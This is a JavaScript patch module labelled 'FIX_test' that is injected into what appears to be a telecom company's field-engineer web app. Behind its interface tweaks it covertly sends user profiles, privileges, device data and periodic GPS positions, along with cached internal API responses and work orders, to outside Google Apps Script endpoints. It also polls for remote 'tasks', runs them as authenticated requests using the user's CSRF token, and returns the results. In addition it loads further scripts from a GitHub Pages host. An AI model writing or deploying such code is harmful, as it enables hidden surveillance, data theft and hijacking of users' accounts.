window.FIX_test_version='FIX_test_21.04.23';
window.FIX_test_app_version='FIX_test v1.6.2';
window.FIX_test_app_url='https://drive.google.com/file/d/1bD82Pv8wkmZURSpj0nnasPjdrDEpwxWY';
window.FIX_test_DEV=!Boolean(window.AppInventor);
if(window.FIX_test_DEV){
  window.AppInventor={
    setWebViewString:function(str){console.log(str);this.str=str},
    getWebViewString:function(){return this.str},
    str:'',
  };
};
window.__defineGetter__('devVueTemplateMark',()=>`<tt style="position:absolute;font-size:10px;line-height:10px;color:#888888;">${new Date().toLocaleTimeString()} ${crypto.randomUUID()}</tt>`);
String.prototype.devVueTemplateMark=function(template=this){return template.match(/>/g)>2?template.replace('>','>'+window.devVueTemplateMark):`<div style="display:contents;">${window.devVueTemplateMark}${template}</div>`};

function createScriptCrcElement(id='',src=''){
  document.getElementById(id)?.remove();
  document.body.insertAdjacentElement('afterBegin',Object.assign(document.createElement('script'),{src,id}));
};
function createStyleElement(id='',css=''){
  document.getElementById(id)?.remove();
  const el=Object.assign(document.createElement('style'),{type:'text/css',id});
  el.appendChild(document.createTextNode(css));
  document.body.insertAdjacentElement('afterBegin',el);
};
createStyleElement('fix-test-app-css',`
  .ports-map__grid--gap-4px{gap:4px;}
  .blink-2s {
    animation: keyframes-blink-opacity-1-02 2s infinite; 
  }
  @keyframes keyframes-blink-opacity-1-02 {
    0% { opacity: 1; }
    50% { opacity: 0.2;}
  }
  .margin-left-tight-16px {
    margin-left: 16px;
    margin-right: 16px;
  }
  #watermark tt {
    font-weight: bold;
  }
`);


window.AppInventor.setWebViewString(`on:moduleOk:::=${window.FIX_test_version}`);
window.AppInventor.setWebViewString(`set:FollowLinks:::=false`);//костыль для 1.5.3
console.log(window.FIX_test_version,new Date().toLocaleString());
const info={
  ...filterProps(window,['innerWidth','innerHeight','outerWidth','outerHeight','devicePixelRatio']),
  visualViewport:filterProps(window.visualViewport,['width','height']),
  navigator:{
    ...filterProps(window.navigator,'vendor,vendorSub,productSub,buildID,platform,appName,appVersion,appCodeName,maxTouchPoints,hardwareConcurrency,standalone,product,userAgent,language,oscpu,deviceMemory'),
    connection:filterProps(window.navigator.connection,'effectiveType,rtt,downlink,saveData'),
  }
}
window.navigator.getBattery().then(battery=>{info.navigator.battery=filterProps(battery,'charging,chargingTime,dischargingTime,level')});

function filterProps(object,attrs){if(typeof attrs==='string'){attrs=attrs.split(',')};let obj={};for(let key in object){if(attrs.includes(key)){obj[key]=object[key];};};return obj;};
document.querySelector("head > meta[name=csrf-token]").content='';
window.node_id='n'+randcode(10);
let config_id='initial';
function randcode(n=1,s='0123456789QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp'){let str='';while(str.length<n){str+=s[Math.random()*s.length|0]};return str;};
function randUN(n=1){return randcode(n,'0123456789QAZWSXEDCRFVTGBYHNUJMIKOLP')}
let timeout_get=10000;
let enable_get=true;
let current_app_version='';
let username='';//app.$store.getters['main/userData']
fetch('/call/main/get_user_data').then(r=>r.json()).then(resp=>{
  if(resp?.data?.username){
    const {data:user_data={}}=resp;
    username=user_data.username;
    window.AppInventor.setWebViewString(`set:username:::=${username}`);
    const {latitude,longitude,location,privileges}=user_data;
    fetch('https://script.google.com/macros/s/AKfycbxcjq8pzu4Jz_Uf1TrXRSFDHCzV64IFvhSqfvdhe3vjZmWq5J2VMayUjJsZRvKgp7_K/exec',{//inform on start
      method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
      body:JSON.stringify({username,node_id:window.node_id,info,user_data,latitude,longitude,location,privileges,date:new Date(Date.now()).toString()})
    }).catch(console.warn).finally(()=>{
      let t=setTimeout(get,timeout_get);
      function get(){//get stat
        fetch(`https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec?username=${username}&node_id=${window.node_id}&config_id=${config_id}`).then(r=>r.json()).then(obj=>{
          const {config={},task={}}=obj;
          if(config){config_id=config?.config_id||config_id;timeout_get=config?.timeout||timeout_get;};
          const {task_id='',url='',method='',body={}}=task;
          if(task_id&&url&&method){
            fetch(url,((method==='POST')?Object.assign({method,headers:{'Content-Type':'application/json;charset=utf-8','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content')}},body?({body:JSON.stringify(body||{},null,2)}):{}):null)).then(r=>r.json()).then(response=>{
              if(response){
                fetch('https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},body:JSON.stringify({username,node_id:window.node_id,task:{task_id,response,isError:false}})}).then(r=>{next()}).catch(e=>{console.log(e);next()})
              }else{next()}
            }).catch(e=>{console.warn(e);next()})
          }else{next()}
        }).catch(e=>{console.warn(e);next()});
        function next(){if(enable_get){t=setTimeout(get,timeout_get)}};
      };
    });
    
    fetch(`https://script.google.com/macros/s/AKfycbxSwKUcTppHjUXcVxSyrx-CjyitTp8VUgBSQ0BOu3a2npDRKBRSDjLjnyIIwo69bXMq7A/exec?select_user_by_name=${username}`).then(r=>r.json()).then(appInfo=>{
      const {appVersion='',userAgent=''}=appInfo?.[username]||{};
      current_app_version=appVersion;
      if(current_app_version){
        if(!document.getElementById('app_version_label')){
          const isNeedUpdate=window.FIX_test_app_version!==current_app_version;
          document.body.insertAdjacentHTML('beforeend',`<div id="app_version_label" style="position:absolute;top:0;left:0;width:100%;white-space:pre;font-size:12px;${isNeedUpdate?'background:#00000022;':''}">${current_app_version} ${isNeedUpdate?'(требуется обновление!)':''}</div>`);
          if(isNeedUpdate){
            setTimeout(()=>{
              //const style=document.createElement('style');style.appendChild(document.createTextNode(`body{opacity:0.2;}`));document.head.appendChild(style);
              document.body.insertAdjacentHTML('afterbegin',`<div style="position:absolute;">Error: ${window.node_id}</div>`);
            },parseInt(randcode(5,'1234567890')));
            
            document.body.insertAdjacentHTML('beforeend',`<input type="button" id="btn_slim_app_update" value="установить" style="position:absolute;top:0;right:0;height:16px;font-size:12px;line-height:10px;"/>`);
            document.getElementById('btn_slim_app_update')?.addEventListener('click',()=>{
              window.AppInventor.setWebViewString(`set:FollowLinks:::=true`);
              //window.location.href=window.FIX_test_app_url;
              window.open(window.FIX_test_app_url,'_self');
            });
          }
        }
      }
    })
    
  };
});

/*
document.body.insertAdjacentHTML('beforeend',`<input type="button" id="btn_refresh" value="refresh" style="position:absolute;top:0;right:0;"/>`);
document.getElementById('btn_refresh')?.addEventListener('click',()=>{
  window.AppInventor.setWebViewString(`set:FollowLinks:::=true`);
  window.location.href='https://fx.mts.ru/fix';
});*/
/*
document.body.insertAdjacentHTML('beforeend',`<input type="button" id="btn_slim_refresh" value="${window.node_id}" style="position:absolute;top:0;right:0;height:16px;font-size:12px;line-height:10px;"/>`);
document.getElementById('btn_slim_refresh')?.addEventListener('click',()=>{
  window.AppInventor.setWebViewString(`set:FollowLinks:::=true`);
  window.location.href='https://fx.mts.ru/fix';
});*/

//test inventory
/*if(store?.state?.main?.userData?.username=='mypanty1'){
  window.AppInventor.setWebViewString(`set:FollowLinks:::=true`)
};*/

//async function httpGet(url,quiet){const response=await httpRequest('GET',url,null,quiet);pushResponse({url,response});return response};
//fix site_entrance_list
async function httpGet(url,quiet){
  //const url=/site_entrance_list\?/.test(_url)?_url.replace('site_entrance_list','site_flat_list'):_url;
  //if(_url!==url){httpRequest('GET',_url,null,quiet)};
  const response=await httpRequest('GET',url,null,quiet);
  pushResponse({url,response});
  return response
};
const max_buffer_size=20;
const buffer=new Map();
function pushResponse({url,response}={}){
  buffer.set(url,response);
  if(window.FIX_test_DEV){console.log('buffer.size:',buffer.size)}
  if(buffer.size<max_buffer_size){return};
  const entries=[...buffer.entries()];
  const region_id=store.getters.regionID||store.getters.regionId;
  const username=store.getters.userLogin;
  if(window.FIX_test_DEV){console.log('buffer.size==max_buffer_size:',region_id,username,entries)};
  if(region_id===54&&username&&!window.FIX_test_DEV){
    fetch('https://script.google.com/macros/s/AKfycbzV-IEHP2thb4wXGXPwmflsGwT8MJg-pGzXd1zCpekJ3b0Ecal6aTxJddtRXh_qVu0-/exec',{
      method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
      body:JSON.stringify({region_id,username,entries})
    })
  }
  buffer.clear()
};

//port refree
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/AbonPortRefree.js',type:'text/javascript'}));
//SitePlanDownload
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/SiteExt.js',type:'text/javascript'}));
//SendKionPq
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/SendKionPq.js',type:'text/javascript'}));
//SiteLinkChangeTraps
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/SiteLinkChangeTraps.js',type:'text/javascript'}));
//ToolsPageContent
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/ToolsPageContent.js',type:'text/javascript'}));

//add port disable approve dialog
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/PortActionDisableApproveModal.js',type:'text/javascript'}));
/*
const GoBillingServiceLbsv = new class GoBillingServiceLbsv extends GoRequestService {
  getVgroupEx(serverID, vgID, ActivTaskNumber, ServiceType) {
    return this.post('GetVgroupEx', this.mergeParams({
      serverid: serverID,
      vgroupid: vgID
    }), this.metaDataHeaders({ActivTaskNumber, ServiceType}));
  }
}('/v1/BillingService/Lbsv');

[GoOctopusService, GoRemedyWorkService, GoNiossService, GoDeviceServiceDnm, GoSiebelService, GoMangoService, GoSwitchRep, GoEmailer, GoMaintenance, GoBillingServiceLbsv].forEach(service=>{
  service.metaDataHeaders = function(metaData = {}, headers = {}){
    return {
      ...headers,
      'Grpc-Metadata-X-Log': Object.entries({
        ...metaData,
        'InetcoreUserLogin': store.getters.userLogin,
        'InetcoreUserRegionID': store.getters.regionID,
        'InetcoreUserPosition': (store.getters['main/lastCoords'] || store.getters.respawn || DEFAULT_COORDS).map(c => parseFloat(c).toFixed(5)).join('/'),
        'InetcoreUserPlatform': window.navigator.platform,
        'InetcoreUserConnection': [window.navigator.connection.effectiveType, window.navigator.connection.downlink].join('/'),
      }).map(([key, value]) => (`${key}=${value}`)).join(',')
    }
  }
});

Vue.mixin({
  beforeCreate(){
    if(this.$options.name=='MacEntityItem'){
      this.$options.template=`<div class="display-flex margin-left-right-16px align-items-center gap-2px" @click="$emit('onClick',onClick())">
        <div class="font--12-400 white-space-pre"><slot name="label">{{label}}:</slot></div>
        <slot name="content">
          <div class="font--13-500 white-space-pre padding-left-right-4px border-radius-4px" :class="textBgClass">{{text}}</div>
        </slot>
        <slot name="arrow">
          <div v-if="showArrow" class="ic-20 ic-right-1 main-lilac bg-main-lilac-light border-radius-4px cursor-pointer"></div>
        </slot>
      </div>`
    };
    if(this.$options.name=='AbonPortBindSearchAbon'){
      this.$options.methods.updateLbsvResource = async function({serverid,vgid}={}){
        if(!serverid||!vgid){return};
        const {vgroups}=this.lbsv;
        try{
          const serviceType = vgroups?.find(vg => vg.vgid === vgid)?.type;
          const response = await GoBillingServiceLbsv.getVgroupEx(serverid, vgid, this.activeWfmTask?.NumberOrder, serviceType);
          if(!response?.data?.vgid){return};
          const currentVg=vgroups.find(vg=>vg.vgid==vgid);
          if(!currentVg){return};
          const currentVgIndex=vgroups.findIndex(vg=>vg.vgid==vgid);
          this.$set(this.lbsv.vgroups,currentVgIndex,{
            ...currentVg,
            ...response.data
          });
        }catch(error){
          console.warn(error);
        }
      }
    }else if(this.$options.name=='LbsvContent' || this.$options.name=='LbsvB2bContent'){
      this.$options.methods.updateAgreementServices = async function(){
        const {serverID}=this;
        // this.agreementServicesUpdated={};
        for (const service of Object.values(this.agreementServices)) {
          try{
            const response = await GoBillingServiceLbsv.getVgroupEx(serverID, service.vgid, this.activeWfmTask?.NumberOrder, service.type);
            if(response?.data?.vgid){
              this.$set(this.agreementServicesUpdated,response.data.vgid,response.data);
            };
          }catch(error){
            console.warn(error);
          };
        };
      }
    }
  }
})

app.$router.addRoutes([
  {
    path: '/VacantTasks',
    name: 'R_VacantTasks',
    component: Vue.component('VacantTasks', {
      template: `<div class="display-flex flex-direction-column gap-8px">
        <iframe src="https://auth.mgts.ru/vtf" style="width:100%;height:90vh;border:none;"/>
      </div>`
    }),
  }
]);
Vue.component('SideBarMenuItemWfmVacantTaskWeb',{
  template:`<div class="display-flex align-items-center gap-8px cursor-pointer" @click="onClick" v-if="isB2CEngineer">
    <IcIcon name="fas fa-link" color="#5642bd" class="font-size-22px"/>
    <span>Биржа нарядов</span>
    <div class="margin-left-auto">
      <IcIcon name="fa fa-chevron-right"/>
    </div>
  </div>`,
  computed:mapGetters([
    'userLogin',
    'isB2CEngineer',
    'vacantTaskWebURI'
  ]),
  methods:{
    onClick(){
      const _uri = this.vacantTaskWebURI;
      const uri = /(auth.mgts.ru)/.test(_uri) ? `https://auth.mgts.ru/vtf` : _uri
      if(this.$store.getters['app/isApp']){
        this.$store.dispatch('app/actionView', uri);
      }else{
        window.open(uri, '_blank');
      }
      this.$store.dispatch('menu/close');
    },
  }
});

createStyleElement('watermark-css',`
  #watermark {
    width: 100%;
    height: 100%;
    position: fixed;
    inset: 0;
    opacity: 0.007;
    pointer-events: none;
    z-index: 99988;
  }
  #watermark tt {
    display: block;
    font-weight: bold;
    font-family: monospace;
    font-size: 30px;
    line-height: 28px;
    text-align: center;
    color: #000000;
  }
`);
function setWatermark(values = []){
  let watermark = document.querySelector('#watermark');
  if(!watermark){
    document.body.insertAdjacentHTML('beforeEnd', `<div id="watermark"></div>`)
    watermark = document.querySelector('#watermark');
    if(!watermark){return};
  };
  watermark.innerHTML = values.map((value) => `<tt>${value}</tt>`).join('').repeat(30);
};
setWatermark([store.getters.userLogin]);
app.$router.afterEach((to, from)=>{
  setWatermark([...Object.values(to.params).reduce((values, value)=>{
    if(value && ['number', 'string'].includes(typeof value)){
      values.add(value)
    };
    return values;
  }, new Set([store.getters.userLogin]))]);
});
*/

let sendStateTimer=null;
let savePositionTimer=null;
const stateBuffer=new Set();

if(store.getters.userLogin&&!window.FIX_test_DEV){
  saveUserStateToBuffer();
  getUserStateBufferAndSend();
  
  sendStateTimer=setInterval(()=>{
    getUserStateBufferAndSend();
  },300000);//5min
  
  savePositionTimer=setInterval(()=>{
    saveUserStateToBuffer();
  },100000);//1min
};

async function saveUserStateToBuffer(){
  const date=new Date().toLocaleString();
  const time=Date.now();
  const getBattery=await window.navigator.getBattery();
  const {charging,chargingTime,dischargingTime,level}=getBattery||{};
  const battery=!getBattery?null:{charging,chargingTime,dischargingTime,level};
  const {effectiveType,rtt,downlink,downlinkMax,type}=window.navigator.connection||{};
  const connection={effectiveType,rtt,downlink,downlinkMax,type};
  if(window?.ymaps?.geolocation){
    console.info('geolocation by ymaps');
    window.ymaps.geolocation.get({}).then(result=>{
      let position=result?.geoObjects?.position;
      if(!position){
        getByNavigator({date,time,battery,connection});
        return
      };
      position=[...position];
      stateBuffer.add({date,time,position,battery,connection});
    });
  }else if('geolocation' in navigator){
    console.info('geolocation by navigator');
    getByNavigator({date,time,battery,connection});
  }else{
    console.info('no geolocation');
    stateBuffer.add({date,time,position:null,battery,connection});
  };
  
  function getByNavigator({date,time,battery,connection}){
    if('geolocation' in navigator&&'getCurrentPosition' in navigator.geolocation){
      navigator.geolocation.getCurrentPosition((result)=>{
        const {latitude,longitude}=result?.coords||{};
        if(!latitude||!longitude){
          stateBuffer.add({date,time,position:null,battery,connection})
          return
        };
        const position=[latitude,longitude];
        stateBuffer.add({date,time,position,battery,connection});
      });
    }else{;
      stateBuffer.add({date,time,position:null,battery,connection})
      return
    }
  }
};

async function getUserStateBufferAndSend(){
  const username=store.getters.userLogin;
  if(!username){return};
  
  const region_id=store.getters.regionID||store.getters.regionId;
  const position_ldap={
    latitude:store.getters.respawn?.[0],
    longitude:store.getters.respawn?.[1],
  };
  
  const history=[...stateBuffer];
  const date=new Date().toLocaleString();
  const time=Date.now();
  const position=history[history.length-1]?.position||null;
  const getBattery=await window.navigator.getBattery();
  const {charging,chargingTime,dischargingTime,level}=getBattery||{};
  const battery=!getBattery?null:{charging,chargingTime,dischargingTime,level};
  const {effectiveType,rtt,downlink,downlinkMax,type}=window.navigator.connection||{};
  const connection={effectiveType,rtt,downlink,downlinkMax,type};
  
  const platform=window.navigator.platform;
  const {mobile,platform:_platform}=window.navigator.userAgentData||{};
  const userAgentData={mobile,platform:_platform};
  
  getUserStateAndSend({username,region_id,position_ldap,position,history,date,time,battery,connection,platform,userAgentData});
  stateBuffer.clear();
  
  function getUserStateAndSend({username,region_id,position_ldap,position,history,date,time,battery,connection,platform,userAgentData}){
    const sites=getSitesCache();//{}
    const tasks=getTasksCache();//[]
    
    getSitesToCacheIfNotPresent({tasks,sites});
    
    console.log({username,position,region_id,position_ldap,sites,tasks,history,date,time,battery,connection,platform,userAgentData});
    sendUserState({username,position,region_id,position_ldap,sites,tasks,history,date,time,battery,connection,platform,userAgentData});
  };
  
  function getTasksCache(){
    return [...store.getters['wfm/tasks']].reduce((tasks,task)=>{
      const {
        NumberOrder:task_id,
        siteid:site_id,
        AddressSiebel:address,
        Number_EIorNumberOrder:order,
        tasktype:type,
        status,
        OperationConcatenation:operationStr,
        Appointment:timeAppointment,
        Assignment:timeAssignment,
        TimeModified:dateModifed,
        LoginName:username,
        dateAssignment,
        clientNumber:account,
      }=task;
      const operations=operationStr?.split(',')||[];
      tasks[task_id]={
        task_id,site_id,username,
        account,address,order,
        type,status,operations,
        timeAppointment,
        timeAssignment,dateAssignment,
        dateModifed
      };
      return tasks
    },{})
  };

  function getSitesCache(){
    return Object.assign(Object.entries(localStorage).reduce((sites,[key,value])=>{
      if(!/^(building|buildings|get_nioss_object|getSite)/i.test(key)){return sites};
      let data=null;
      try{
        value=JSON.parse(value);
        if(value?.data){
          data=value?.data
        };
      }catch(error){
        return sites
      };
      
      if(!data){return sites};
      
      if(data?.site_id&&data?.latitude){//building by coords
        const {site_id,region_id,latitude,longitude}=data;
        if(!sites[site_id]){sites[site_id]={site_id}};
        sites[site_id]=Object.assign(sites[site_id],{site_id,latitude,longitude,region_id});
      }else if(data?.length&&data[0]?.coordinates){//buildings by coords
        for(const site of data){
          const {id:site_id,coordinates:{latitude,longitude}}=site;
          if(!sites[site_id]){sites[site_id]={site_id}};
          sites[site_id]=Object.assign(sites[site_id],{site_id,latitude,longitude});
        };
      }else if(data?.LatitudeWGS){//get_nioss_object by id
        const {resource_business_name:name,LatitudeWGS:latitude,LongitudeWGS:longitude}=data;
        const site_id=key.split('/')[1];
        const region_id=name?.split('_')[1];
        if(!sites[site_id]){sites[site_id]={site_id}};
        sites[site_id]=Object.assign(sites[site_id],{site_id,latitude:parseFloat(latitude),longitude:parseFloat(longitude),name,region_id:parseInt(region_id)});
      }else if(data?.id&&data?.coordinates){//getSite by pattern=id
        const {id:site_id,coordinates:{latitude,longitude},name,address}=data;
        if(!sites[site_id]){sites[site_id]={site_id}};
        sites[site_id]=Object.assign(sites[site_id],{site_id,latitude,longitude,name,address})
      };
      
      return sites;
    },{}),
      /*app.routerHistory*/[].reduce((sites,route)=>{
      const site=route?.params?.siteProp
      if(site){
        const {id:site_id,coordinates:{latitude,longitude},name,address}=site;
        sites[site_id]={site_id,latitude,longitude,name,address}
      }
      return sites
    },{}));
  };
  
  function sendUserState(payload={}){
    try{
      fetch('https://script.google.com/macros/s/AKfycbzmM_kE0O7VjZcGijRPkmnwq3vsADjVdaKk9jOmtI7P4bcjwpGiVpzM7QLg1deraDtV-w/exec',{
        method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
        body:JSON.stringify({...payload,api_filter:'5x5'})
      });
    }catch(error){
      
    };
  };
  
  function getSitesToCacheIfNotPresent({tasks,sites}){
    const sites_ids=[...Object.values(tasks).reduce((ids,task)=>{
      const {site_id}=task;
      if(!sites[site_id]){
        ids.add(site_id)
      };
      return ids;
    },new Set())].forEach(site_id=>{
      getSiteAndSaveToCache(site_id);
    });
  };
  
  async function getSiteAndSaveToCache(site_id){return
    if(!site_id){return};
    try{
      const response=await httpGet(buildUrl("search_ma",{pattern:site_id},"/call/v1/search/"));
      if(response.type==='error'){return};
      selectNodeDuAsSiteAndSave(site_id,response.data);
    }catch(error){
      
    };
    
    function selectNodeDuAsSiteAndSave(site_id,response_data){
      if(!response_data){return};
      if(!localStorageCache?.setItem){return};
      if(!site_id){return};
      if(Array.isArray(response_data)){
        localStorageCache.setItem(`getSite/${site_id}`,response_data.find(({type})=>type.toUpperCase()==='ДУ')||response_data[0]);
      }else{
        localStorageCache.setItem(`getSite/${site_id}`,response_data);
      }
    }
  };
};

































































































































